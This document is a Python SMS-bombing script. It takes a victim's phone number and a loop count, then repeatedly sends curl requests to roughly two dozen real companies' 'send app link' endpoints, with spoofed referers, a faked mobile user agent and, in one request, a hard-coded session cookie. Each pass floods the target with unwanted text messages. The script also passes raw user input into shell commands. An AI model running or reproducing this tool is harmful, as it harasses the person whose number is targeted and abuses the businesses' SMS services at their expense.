import os

banner='''
                 UMANG SINGH                                                             
'''

print (banner)
number=input("Enter number:")
number=str(number)
i=int(input("Enter number of loops:"))
for x in range(0, i):
	print ('\x1b[6;30;42m' +'Loop No:'+ str(x) + '\x1b[0m')
	url='''curl --data "txtAppUrlMobileNo='''+number+'''" www.savingo.in/includes/sms_app_url.php --referer http://www.savingo.in/sendapp.php -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "type=3&appmobile='''+number+'''" http://www.bhajiwala.com/newsletter.php --referer http://www.bhajiwala.com/index.php -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "mobno='''+number+'''" http://www.frotels.com/appsendsms.php --referer http://www.frotels.com/appsendsms.php -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "mobile='''+number+'''" http://www.gapoon.com/default/index/downloadapp --referer http://www.gapoon.com/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "phone='''+number+'''" http://www.gmento.com/ajax/professionuser/addMobile --referer http://www.gmento.com/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "mobile_no='''+number+'''" https://www.goplayr.com/Pages/sendsmsofapplink --referer https://www.goplayr.com/Pages/downloadapp -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "smsmob='''+number+'''" http://www.greyticket.com/assets/php/sky-forms-pro/sendsms.php --referer http://www.greyticket.com/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "mobile_no='''+number+'''" http://hippocabs.com/web/send_app_link.php --referer http://hippocabs.com/web/downloadapp.php -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "number='''+number+'''" http://www.hostguesthome.co.uk/site/sendapplink --referer http://www.hostguesthome.co.uk/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "phone_number='''+number[0:5]+'''s%3A%2F%2Fhousing.com%2Fapps%3Futm_source%3Dhousing_inhouse%26utm_medium%3Dsms%26utm_content%3Dapps_page%26utm_term%3D'''+number+'''%26utm_campaign%3Ddefault&source=web" https://rails.housing.com//api/v1/app_promotion/send_sms?source=web --referer https://housing.com/apps -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "mobile='''+number+'''" http://konsultapp.com/wp-content/themes/konsultapp/sendsms.php --referer http://www.konsultapp.com/app-download/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "phone='''+number+'''" https://theporter.in/restservice/send_app_link_sms --referer https://theporter.in/app -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "txtAppUrlMobileNo='''+number+'''" www.savingo.in/includes/sms_app_url.php --referer http://www.savingo.in/sendapp.php -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "mobile_number='''+number+'''" https://scripbox.com/marketting/sms_app_link  --referer https://scripbox.com/mobile-app -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "userMobileNumber='''+number+'''" https://www.timesaverz.com/api/sendDownloadLink.php --referer https://www.timesaverz.com/download-app --cookie "PHPSESSID=aajnd96phig7ct5mnbjr8vv0a0; cartItemsCount=0; mp_8bcd3ed578737395ee005deef103171d_mixpanel=%7B%22distinct_id%22%3A%20%22159c5b86a3f44d-0f0d2b062532318-3e045f7b-100200-159c5b86a40796%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; mp_mixpanel__c=0; timesaverzUserCity=1; timesaverzUserCityName=Mumbai; __zlcmid=eigAZEMGmtSUda" -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --data "phone='''+number+'''" http://ziptown.in/site/sendapplink --referer http://ziptown.in/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)

	url='''curl https://www.hdfcred.com/mobile_v2/rest/sms/number='''+number+''' --referer https://www.hdfcred.com/app/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --url "http://oncallservice.in/api/Service/sendApplicationLink?Mobile='''+number+'''&Os=android" --referer http://www.oncallservice.in/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --url "http://oncallservice.in/api/Service/sendApplicationLink?Mobile='''+number+'''&Os=windows" --referer http://www.oncallservice.in/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --url "http://oncallservice.in/api/Service/sendApplicationLink?Mobile='''+number+'''&Os=iphone" --referer http://www.oncallservice.in/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl https://api.tinyowl.com/user/app_download/sms?number='''+number+''' --referer https://runnr.in/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl https://beta.shedoctr.com/v1/sendAppLink?mobile_no='''+number+''' --referer https://www.shedoctr.com/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --url "https://api.tinyowl.com/user/app_download/sms?number='''+number+'''" --referer https://runnr.in/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --url "http://www.trabol.com/web/download_mobile_apps?utf8=%E2%9C%93&subscription%5Bphone_number%5D='''+number+'''&commit=Send+App+Link" --referer http://www.trabol.com/mobile-apps/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
	os.system(url)
	url='''curl --url "https://zipgo.in/send_sms?utf8=%E2%9C%93&phone='''+number+'''" --referer https://zipgo.in/ -A "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"'''
os.system(url)
